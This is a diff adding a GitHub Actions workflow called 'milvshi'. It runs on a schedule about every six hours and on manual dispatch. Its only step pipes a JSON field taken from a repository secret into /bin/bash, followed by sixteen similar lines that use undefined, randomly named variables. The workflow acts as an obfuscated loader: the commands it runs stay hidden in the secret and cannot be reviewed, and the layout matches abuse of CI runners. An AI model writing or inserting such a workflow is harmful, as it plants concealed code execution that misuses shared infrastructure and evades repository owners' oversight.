@@ -1,0 +1,33 @@
+name: milvshi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: milvshi
+        env:
+          kg39262: ${{ secrets.kg39262 }}
+        run: |
+          echo $kg39262 | jq -r .e25413 | /bin/bash
+          echo $nnugb179 | jq -r .jy69 | /bin/bash
+          echo $tarv017 | jq -r .pnrz95 | /bin/bash
+          echo $qyegn03898 | jq -r .g13503 | /bin/bash
+          echo $yk5264 | jq -r .c33580 | /bin/bash
+          echo $bpbc92899 | jq -r .q74 | /bin/bash
+          echo $hxr76 | jq -r .lhjmd90 | /bin/bash
+          echo $wg187 | jq -r .lt9 | /bin/bash
+          echo $zqa8430 | jq -r .dqvmc8 | /bin/bash
+          echo $d4 | jq -r .oxbso915 | /bin/bash
+          echo $vumc4 | jq -r .p8 | /bin/bash
+          echo $tkrnt5 | jq -r .dlor1423 | /bin/bash
+          echo $xc752 | jq -r .u6007 | /bin/bash
+          echo $txx38 | jq -r .eyz23612 | /bin/bash
+          echo $jvgmt45919 | jq -r .eaeo0 | /bin/bash
+          echo $dgov384 | jq -r .favd97945 | /bin/bash
+          echo $vywrc1 | jq -r .k8953 | /bin/bash
+
